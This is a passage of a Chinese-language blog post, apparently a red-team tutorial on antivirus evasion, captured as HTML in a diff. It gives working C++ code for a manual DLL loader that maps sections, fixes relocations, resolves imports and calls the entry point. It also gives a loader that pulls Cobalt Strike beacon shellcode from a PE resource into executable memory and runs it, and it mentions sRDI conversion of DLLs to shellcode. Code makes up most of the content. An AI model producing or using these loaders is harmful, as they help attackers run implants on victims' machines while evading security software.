relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line"></span><br><span class="line">			if (relocationEntries[i].Type == 0)</span><br><span class="line">			&#123;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			DWORD_PTR relocationRVA = relocationBlock-&gt;PageAddress + relocationEntries[i].Offset;</span><br><span class="line">			DWORD_PTR addressToPatch = 0;</span><br><span class="line">			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR), NULL);</span><br><span class="line">			addressToPatch += deltaImageBase;</span><br><span class="line">			std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// resolve import address table</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;</span><br><span class="line">	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</span><br><span class="line">	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);</span><br><span class="line">	LPCSTR libraryName = &quot;&quot;;</span><br><span class="line">	HMODULE library = NULL;</span><br><span class="line"></span><br><span class="line">	while (importDescriptor-&gt;Name != NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		libraryName = (LPCSTR)importDescriptor-&gt;Name + (DWORD_PTR)dllBase;</span><br><span class="line">		library = LoadLibraryA(libraryName);</span><br><span class="line"></span><br><span class="line">		if (library)</span><br><span class="line">		&#123;</span><br><span class="line">			PIMAGE_THUNK_DATA thunk = NULL;</span><br><span class="line">			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">			while (thunk-&gt;u1.AddressOfData != NULL)</span><br><span class="line">			&#123;</span><br><span class="line">				if (IMAGE_SNAP_BY_ORDINAL(thunk-&gt;u1.Ordinal))</span><br><span class="line">				&#123;</span><br><span class="line">					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk-&gt;u1.Ordinal);</span><br><span class="line">					thunk-&gt;u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);</span><br><span class="line">				&#125;</span><br><span class="line">				else</span><br><span class="line">				&#123;</span><br><span class="line">					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk-&gt;u1.AddressOfData);</span><br><span class="line">					DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName-&gt;Name);</span><br><span class="line">					thunk-&gt;u1.Function = functionAddress;</span><br><span class="line">				&#125;</span><br><span class="line">				++thunk;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		importDescriptor++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// execute the loaded DLL</span><br><span class="line">	DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);</span><br><span class="line"></span><br><span class="line">	CloseHandle(dll);</span><br><span class="line">	HeapFree(GetProcessHeap(), 0, dllBytes);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    我们先看一下执行的结果把，如下所示：</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110173735378.png" alt="image-20201110173735378"></p>
+<p>​    也就是通过上面的代码，可以加载并运行我们的dll，了解了这个我们再来看一下代码实现的逻辑。</p>
+<p>​    首先，通过下面的代码声明两个结构体，并且声明了一个函数指针</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef struct BASE_RELOCATION_BLOCK &#123;</span><br><span class="line">	DWORD PageAddress;</span><br><span class="line">	DWORD BlockSize;</span><br><span class="line">&#125; BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;</span><br><span class="line"></span><br><span class="line">typedef struct BASE_RELOCATION_ENTRY &#123;</span><br><span class="line">	USHORT Offset : 12;</span><br><span class="line">	USHORT Type : 4;</span><br><span class="line">&#125; BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;</span><br><span class="line"></span><br><span class="line">using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);</span><br></pre></td></tr></table></figure>
+
+<p>​    下面使用 GetModuleHandleA(NULL)来返回进程的地址空间中的可执行文件的基地址，使用GetFileSize打开我们要加载的DLL文件，再调用在堆上分配大小为dllsize的内存空间，通过ReadFile将DLL文件中的内容写入到刚分配的堆地址空间中。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PVOID imageBase = GetModuleHandleA(NULL);</span><br><span class="line">	HANDLE dll = CreateFileA(&quot;C:\\Users\\admin\\source\\repos\\testDLl\\Debug\\testDLl.dll&quot;, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);</span><br><span class="line">	DWORD64 dllSize = GetFileSize(dll, NULL);</span><br><span class="line">	LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);</span><br><span class="line">	DWORD outSize = 0;</span><br><span class="line">	ReadFile(dll, dllBytes, dllSize, &amp;outSize, NULL);</span><br></pre></td></tr></table></figure>
+
+<p>​    我们调试一下这个程序，可以看到当运行完ReadFile后，确实将DLL的内容复制到了dllBytes指向的内存中。</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110175404600.png" alt="image-20201110175404600"></p>
+<p>​    好了，我们再看一下后面的代码，首先获取dosheaders，再通过dllbytes首地址+dosheaders-&gt;e_lfanew的值相加，得到pe头的地址。再通过取出OptionalHeader.SizeOfImage属性获取映像加载到内存后的大小    。</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111095440475.png" alt="image-20201111095440475"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes; </span><br><span class="line">PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders-&gt;e_lfanew);</span><br><span class="line">SIZE_T dllImageSize = ntHeaders-&gt;OptionalHeader.SizeOfImage;</span><br></pre></td></tr></table></figure>
+
+<p>​        再使用VirtualAlloc分配一块基址为ntHeaders-&gt;OptionalHeader.ImageBase，大小为dllImageSize的内存，并且更改内存为可读写执行权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br></pre></td></tr></table></figure>
+
+<p>​    获取我们预期分配地址和实际分配地址的差值，并且将文件头部复制到分配的内存中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line"></span><br><span class="line">std::memcpy(dllBase, dllBytes, ntHeaders-&gt;OptionalHeader.SizeOfHeaders);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111102159539.png" alt="image-20201111102159539">    </p>
+<p>​    下面的代码将区块表的内容拷贝到分配的内存中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);</span><br><span class="line">for (size_t i = 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">	LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section-&gt;VirtualAddress);</span><br><span class="line">	LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section-&gt;PointerToRawData);</span><br><span class="line">	std::memcpy(sectionDestination, sectionBytes, section-&gt;SizeOfRawData);</span><br><span class="line">	section++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    下面的代码用来修改pe的重定位表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY relocations = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class="line">	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;</span><br><span class="line">	DWORD relocationsProcessed = 0;</span><br><span class="line"></span><br><span class="line">	while (relocationsProcessed &lt; relocations.Size)</span><br><span class="line">	&#123;</span><br><span class="line">		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);</span><br><span class="line">		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);</span><br><span class="line">		DWORD relocationsCount = (relocationBlock-&gt;BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line">		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);</span><br><span class="line"></span><br><span class="line">		for (DWORD i = 0; i &lt; relocationsCount; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line"></span><br><span class="line">			if (relocationEntries[i].Type == 0)</span><br><span class="line">			&#123;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			DWORD_PTR relocationRVA = relocationBlock-&gt;PageAddress + relocationEntries[i].Offset;</span><br><span class="line">			DWORD_PTR addressToPatch = 0;</span><br><span class="line">			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR), NULL);</span><br><span class="line">			addressToPatch += deltaImageBase;</span><br><span class="line">			std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    被注入的DLL可能还依赖于其他的DLL，因此我们还需要装载这些被依赖的DLL，并修改本DLL的引入表，使这些被引入的函数能正常运行。解析导入表，根据IMAGE_IMPORT_DESCRIPTOR中的NAME成员找到DLL的名称，根据名称装载被依赖的DLL,IMAGE_IMPORT_DESCRIPTOR的FirstThunk指向了DLL引入了哪些函数。通过GetProcAddress可以找到函数的地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;</span><br><span class="line">IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</span><br><span class="line">importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);</span><br><span class="line">LPCSTR libraryName = &quot;&quot;;</span><br><span class="line">HMODULE library = NULL;</span><br><span class="line"></span><br><span class="line">while (importDescriptor-&gt;Name != NULL)</span><br><span class="line">&#123;</span><br><span class="line">	libraryName = (LPCSTR)importDescriptor-&gt;Name + (DWORD_PTR)dllBase;</span><br><span class="line">	library = LoadLibraryA(libraryName); </span><br><span class="line"></span><br><span class="line">	if (library)</span><br><span class="line">	&#123;</span><br><span class="line">		PIMAGE_THUNK_DATA thunk = NULL;</span><br><span class="line">		thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">		while (thunk-&gt;u1.AddressOfData != NULL)</span><br><span class="line">		&#123;</span><br><span class="line">			if (IMAGE_SNAP_BY_ORDINAL(thunk-&gt;u1.Ordinal))</span><br><span class="line">			&#123;</span><br><span class="line">				LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk-&gt;u1.Ordinal);</span><br><span class="line">				thunk-&gt;u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk-&gt;u1.AddressOfData);</span><br><span class="line">				DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName-&gt;Name);</span><br><span class="line">				thunk-&gt;u1.Function = functionAddress;</span><br><span class="line">			&#125;</span><br><span class="line">			++thunk;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	importDescriptor++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​    通过AddressOfEntryPoint找到DLL文件的入口点，最终会执行dllmain函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);</span><br></pre></td></tr></table></figure>
+
+<p>​    由于个人windows基础能力有限，关于上面代码的分析参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/others-articles/245305.html">恶意代码分析之反射型DLL注入</a>、<a target="_blank" rel="noopener" href="https://github.com/potats0/PeLoader">peloader</a>，最后我们再理一下这个过程</p>
+<ul>
+<li>在堆上分配一块内存，将DLL文件加载到内存</li>
+<li>将DLL文件头部放到分配的内存上</li>
+<li>将区块表的内容复制到内存</li>
+<li>修改重定向表和解析导入表</li>
+<li>调用DLL</li>
+</ul>
+<h2 id="从PE-resource加载shellcode"><a href="#从PE-resource加载shellcode" class="headerlink" title="从PE resource加载shellcode"></a>从PE resource加载shellcode</h2><p>​    使用这种方式可以将shellcode放到资源文件中进行加载，具体操作过程如下：</p>
+<p>首先生成一个stagerless的bin文件，我这里使用cobaltstrike来进行生成，生成以后将bin添加到资源文件中</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111171204066.png" alt="image-20201111171204066"></p>
+<p>​    选择导入资源，选择我们生成的bin文件，资源类型由我们自己命名</p>
+<img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111175537339.png" alt="image-20201111175537339" style="zoom:67%;">
+
+
+
+<p>​    在头文件中可以看到我们加载的资源文件的标识符。</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111175617208.png" alt="image-20201111175617208"></p>
+<p>​    最后使用如下代码加载资源并进行解析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &quot;resource.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	// IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode</span><br><span class="line">	// METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin</span><br><span class="line">	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_BEACON1), L&quot;METERPRETER_BIN&quot;);</span><br><span class="line">	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);</span><br><span class="line">	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);</span><br><span class="line"></span><br><span class="line">	void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(exec, shellcodeResouceData, shellcodeSize);</span><br><span class="line">	((void(*)())exec)();</span><br><span class="line"></span><br><span class="line">	return  0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    上面的代码首先通过FindResource找到我们想要加载的资源，通过LoadResource加载资源的内容，再通过VirtualAlloc分配一块内存，将资源复制到内存，通过函数指针的方式调用执行shellcode。</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111180732544.png" alt="image-20201111180732544"></p>
+<p>​    也可以将DLL加载到资源中执行，这个操作需要依赖<a target="_blank" rel="noopener" href="https://github.com/monoxgas/sRDI">sRDI</a></p>
+<p>​    首先生成一个dll文件，利用ConvertToShellcode.py将DLL文件转换为bin文件</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111182017884.png" alt="image-20201111182017884"></p>
+<p>​    在vs中将生成的beacon.bin文件放到资源中加载，我测试执行并没有成功，但是生成一个messagebox弹窗的dll转换为bin执行是可以的，原因未知。</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111193353829.png" alt="image-20201111193353829"></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/免杀/">免杀</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
